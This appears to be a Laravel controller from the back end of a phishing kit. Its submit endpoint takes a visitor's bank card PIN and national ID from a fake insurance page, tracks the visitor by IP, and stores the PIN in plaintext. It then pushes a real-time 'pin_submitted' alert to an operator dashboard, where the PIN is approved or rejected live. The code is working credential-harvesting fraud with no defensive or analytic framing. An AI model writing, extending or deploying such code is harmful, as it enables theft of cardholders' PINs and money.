<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Http\Requests\SubmitCardPinRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Cache;

class CustomerCardPinController extends Controller
{
    /**
     * Submit a card PIN for verification (creates a pending PIN record).
     * The admin dashboard will approve/reject it.
     *
     * POST /api/card-pin/submit
     */
    public function submit(SubmitCardPinRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        // Ensure customer profile exists
        $customer = CustomerProfile::createOrUpdateByIP($ip, array_filter([
            'current_page' => '/insurance/card-pin',
            'national_id'  => $validated['national_id'] ?? null,
        ], fn($v) => $v !== null));

        // Idempotency + invalidation inside a transaction to prevent double-submit races
        $pin = \Illuminate\Support\Facades\DB::transaction(function () use ($customer, $validated) {
            // Check for an existing pending PIN created in the last 2 minutes (idempotent)
            $existing = OtpCode::where('customer_profile_id', $customer->id)
                ->ofType('pin')
                ->pending()
                ->where('created_at', '>=', now()->subMinutes(2))
                ->lockForUpdate()
                ->first();

            if ($existing && hash('sha256', $existing->code) === hash('sha256', $validated['pin'])) {
                // Same PIN submitted again — return existing record
                return $existing;
            }

            // Invalidate any previous pending PINs for this customer
            OtpCode::where('customer_profile_id', $customer->id)
                ->ofType('pin')
                ->pending()
                ->update(['status' => 'rejected']);

            // Create new pending PIN
            return OtpCode::create([
                'customer_profile_id' => $customer->id,
                'session_id'          => $validated['session_id'] ?? null,
                'code'                => $validated['pin'],
                'type'                => 'pin',
                'status'              => 'pending',
            ]);
        });

        // Notify admin dashboard in real-time
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'pin_submitted'
            ));
        } catch (\Throwable $e) {
            // Silent fail
        }

        return response()->json([
            'success' => true,
            'message' => 'تم إرسال رقم البطاقة بنجاح',
            'pin_id'  => $pin->id,
            'status_sig' => hash_hmac('sha256', 'pin|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
        ]);
    }
}
